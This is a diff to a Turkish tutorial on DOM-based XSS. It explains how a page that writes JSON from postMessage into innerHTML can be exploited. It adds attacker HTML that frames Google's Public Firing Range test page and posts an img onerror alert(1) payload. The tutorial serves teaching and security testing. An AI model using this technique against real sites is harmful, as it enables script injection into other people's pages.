@@ -110,7 +110,7 @@ Innerhtml'in tehlikeli olma sebebi aşağıdaki koddan da anlaşılabilir. Inner
 </html>
 ```
 
-Aşağıdaki kaynak kodlara sahip hacker.com web sitesinde, iframe ile bu sayfa açıldığını varsayarsak. Sayfa açıldığında bizi xss barındıran siteye götürecektir. 
+Aşağıdaki kaynak kodlara sahip hacker.com web sitesinde, iframe ile bu sayfa açıldığını varsayarsak. Sayfa açıldığında bizi xss barındıran siteye götürecektir. Ama bu, daha dinamik bir şekilde de yapılabilir. 
 
 ```
 <html>
@@ -124,7 +124,7 @@ Aşağıdaki kaynak kodlara sahip hacker.com web sitesinde, iframe ile bu sayfa 
 </html>
 ```
 
-Iframe'i daha dinamik kullanabiliriz. Burada iframe ile istediğimiz sayfayı açtırıp iframe yüklemesi bittikten sonra bu frame içerisine bir postMessage gönderiyoruz. Bu postMessage bir payload barındırmakta. Bu payload'ı JSON olarak gönderiyoruz çünkü hedef sitede JSON parse edilecek. Eğer başka türde veri yollarsak hata alırız. "src" kısmına da adresi koyuyoruz. 
+Bu web sitesi, kendisini iframe ile açan bir sayfadan mesaj alan ve bu mesajdaki veri ile veriyi parse ettikten sonra bir div oluşturuyordu. div'in içeriğine kullanıcıdan aldığı mesajı yazıyor. Sitenin yaptığı işlemler özetle bu şekildeydi. Aşağıdaki kodlarda, JavaScript ile bir EventListener eklenmiş durumda, buradaki EventListener kendisine bir mesaj geldiğinde bu mesajı alır ve postMessageHandler isimli fonksiyona gönderir. Bu sayfayı iframe ile açan başka bir web sitesinin bu web sitesine gönderdiği event mesajını alan fonksiyon bu içeriğin json olmasını beklemektedir. Aldığı bu json’ı parse ettiğinde oluşan içeriği alıp yeni oluşturduğu div’in içerisine HTML şeklinde yerleştirir. Daha sonra da oluşan bu div’i sayfaya eklemektedir. Burada da XSS meydana gelir. 
 
 ```
 <html>
@@ -133,6 +133,22 @@ Iframe'i daha dinamik kullanabiliriz. Burada iframe ile istediğimiz sayfayı a�
     var target = document.getElementById('target');
     target.addEventListener('load',function(){
       var payload = {'html':'x'};
+      target.contentWindow.postMessage(JSON.stringify(payload),'*');
+});
+      target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml"
+  </script>
+</html>
+```
+
+Kodun, sitede pop-up çıkartacak hâli aşağıdadır.
+
+```
+<html>
+    <iframe id = "target" src = ""> </iframe>
+  <script>
+    var target = document.getElementById('target');
+    target.addEventListener('load',function(){
+      var payload = {'html':'<img src=x onerror=alert(1)>'};
       target.contentWindow.postMessage(JSON.stringify(payload),'*');
 });
       target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml"
